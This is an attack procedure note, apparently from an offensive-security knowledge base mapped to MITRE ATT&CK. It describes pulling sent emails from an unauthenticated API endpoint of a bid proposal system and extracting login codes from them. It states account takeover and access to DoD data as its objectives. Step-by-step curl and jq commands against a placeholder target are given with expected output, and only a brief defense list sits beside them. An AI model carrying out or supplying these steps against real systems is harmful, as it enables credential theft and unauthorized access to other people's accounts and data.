---
tags:
  - credential-access
  - email-leak
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-get-email-messages-endpoint]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Automated Collection]]'
updated_at: '2025-12-14T17:32:01.593Z'
skill_level: beginner
impact_level: critical
detection_risk: low
sub_techniques: []
id: 144848be-bf27-4ee5-b0a9-b8f1b8caadbd
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Automated Collection]]'
---
# Retrieve-Sent-Emails-Including-Authentication-Codes

## Summary

This procedure fetches all sent emails via an unauthenticated API endpoint exposing authentication codes that enable unauthorized login to the Seaport Bid proposal system.

## Description

Exploiting the /api/1_0/EmailMessages endpoint the procedure retrieves historical emails containing temporary codes like '373A51' for the /Bid/ portal. This improper access control in test APIs allows credential theft and account compromise in DoD environments. Discovered via Swagger it requires only public access; outcomes include code extraction for full system takeover and data exfiltration.

## Requirements

1. API endpoint from documentation
2. curl for HTTP GET
3. Ability to parse JSON for code extraction

## Defense

Defensive measures and detection strategies:

- Authenticate all email retrieval endpoints
- Expire and obfuscate auth codes quickly; avoid email transmission if possible
- Monitor for bulk email API requests and implement anomaly detection

## Objectives

1. Access sent emails without credentials
2. Extract authentication codes for proposal system
3. Enable account takeover and DoD data access

## Instructions

### Step 1: Fetch Email Messages

**Context**: GET all sent emails to scan for codes.

**Command** ([[commands/curl-get-email-messages-endpoint]]):
```bash
curl -X GET "https://target/api/1_0/EmailMessages" -H "Accept: application/json"
```

> Expected output: JSON of emails e.g. {"messages": [{"content":"Your code is 373A51 for https://target/Bid/"}]}.

### Step 2: Extract and Validate Codes

**Context**: Search response for auth codes.

Use grep or jq:
```bash
curl -X GET "https://target/api/1_0/EmailMessages" | jq ".messages[].content | select(contains("code"))"
```

> Expected output: Lines with codes like '373A51' confirming exposure.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Automated Collection]]

### Sub-Techniques


## Commands Used

- [[commands/curl-get-email-messages-endpoint]]

## Tools Used

- [[tools/curl]]

## Tags

- [[credential-access]]
- [[email-leak]]
